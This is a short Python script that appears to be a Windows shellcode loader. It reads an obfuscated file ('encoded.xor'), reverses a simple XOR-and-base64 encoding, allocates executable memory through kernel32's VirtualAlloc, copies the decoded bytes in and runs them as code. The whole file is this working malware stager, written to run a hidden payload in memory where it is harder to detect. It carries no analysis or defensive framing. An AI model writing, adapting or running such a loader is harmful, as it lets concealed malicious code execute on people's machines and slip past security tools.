import base64
import ctypes

def run_code_windows(shellcode):
    k32 = ctypes.windll.kernel32
    k32.VirtualAlloc.restype = ctypes.c_void_p
    mem = k32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
    
    if not mem:
        return 1

    ctypes.memmove(mem, shellcode, len(shellcode))
    
    executor = ctypes.CFUNCTYPE(ctypes.c_int)(mem)
    return executor()

m_core_raw = open("encoded.xor", encoding='utf-8').read()
decoded_str = ""

for i in range(0, len(m_core_raw), 3):
    t = m_core_raw[i:i+3]
    if t:
        t_val = int(t) ^ 5
        decoded_str += chr(t_val)

try:
    final_shellcode = base64.b64decode(decoded_str)
    run_code_windows(final_shellcode) 
except Exception as e:
    print(e)
